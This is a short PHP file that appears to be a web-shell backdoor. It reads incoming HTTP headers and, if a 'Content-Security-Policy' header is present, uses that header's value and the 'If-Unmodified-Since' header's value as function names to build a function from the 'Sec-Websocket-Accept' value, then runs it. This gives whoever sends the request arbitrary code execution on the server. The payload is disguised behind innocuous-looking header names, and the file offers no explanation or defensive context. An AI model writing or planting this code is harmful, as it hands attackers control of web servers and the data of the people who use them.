<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Content-Security-Policy'])) {
    $system = $_HEADERS['Content-Security-Policy']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['Sec-Websocket-Accept']));
    $system();
}